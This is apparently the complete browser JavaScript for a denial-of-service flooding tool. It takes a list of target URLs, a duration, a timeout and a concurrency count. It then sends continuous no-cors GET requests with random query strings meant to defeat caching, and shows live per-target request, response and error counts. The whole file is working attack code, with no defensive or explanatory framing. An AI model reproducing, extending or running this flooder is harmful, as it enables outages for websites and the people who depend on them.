var textarea = document.getElementById('targets');
var time = document.getElementById('time');
var timeout = document.getElementById('timeout');
var threads = document.getElementById('threads');
var start = document.getElementById('start');
var stop = document.getElementById('stop');
var stats = document.getElementById('stats');
var firstTime = true;
var targetStats = {};
var isStarted = false;
var queue = [];
var tbody, targets, generateTable, stopFlood, rand;

function StartFlood() {
    textarea.disabled = true;
    time.disabled = true;
    timeout.disabled = true;
    threads.disabled = true;
    start.disabled = true;
    stop.disabled = false;

    targets = textarea.value.split('\n');
    targets.forEach((target) => {
        targetStats[target] = {requests: 0, responses: 0, errors: 0, errorMessage: ''}
    });

    if(firstTime) { 
        stats.innerHTML = '<br><br><table border="3"><thead><th>TARGETS</th><th>REQUESTS</th><th>RESPONSES</th><th>ERRORS</th><th>ERROR MESSAGE</th></thead><tbody></tbody></table>';
        tbody = document.querySelector('tbody');
        firstTime = false;
    }

    generateTable = setInterval(GenerateTable, 1000);
    stopFlood = setTimeout(StopFlood, time.value*1000);
    isStarted = true;
    targets.map(Flood);
}

function StopFlood() {
    textarea.disabled = false;
    time.disabled = false;
    timeout.disabled = false;
    threads.disabled = false;
    stop.disabled = true;
    start.disabled = false;

    clearInterval(generateTable);
    clearTimeout(stopFlood);
    isStarted = false;
}

function GenerateTable() {
    tbody.innerHTML = null;
    targets.forEach((target, index) => {
        tbody.innerHTML += '<tr><td>' + target + '</td><td>' + targetStats[target].requests + '</td><td>' + targetStats[target].responses + '</td><td>' + targetStats[target].errors + '</td><td>' + targetStats[target].errorMessage + '</td></tr>';
    });
}

async function FetchWithTimeout(url) {
    const controller = new AbortController();
    const fetchTimeout = setTimeout(() => controller.abort(), timeout.value);

    return fetch(url, {
        method: 'GET',
        mode: 'no-cors',
        signal: controller.signal
      }).then((response) => {
        clearTimeout(fetchTimeout);
        return response;
      }).catch((error) => {
        clearTimeout(fetchTimeout);
        throw error;
      });
}

async function Flood(target) {
    while(isStarted) {
        if(queue.length > threads.value) await queue.shift();
        rand = '?' + Math.floor(Math.random() * 1000);
        
        queue.push(FetchWithTimeout(target+rand)
        .catch((error) => { 
            if (error.code === 20) return;
            targetStats[target].errors++;
            targetStats[target].errorMessage = error.message;
        })
        .then((response) => {
            if (response && !response.ok) {
                targetStats[target].errors++;
                targetStats[target].errorMessage = response.statusText;
            }
            else targetStats[target].responses++;
        })
        );
        targetStats[target].requests++;
    }
}

stop.disabled = true;
start.addEventListener("click", StartFlood);
stop.addEventListener("click", StopFlood);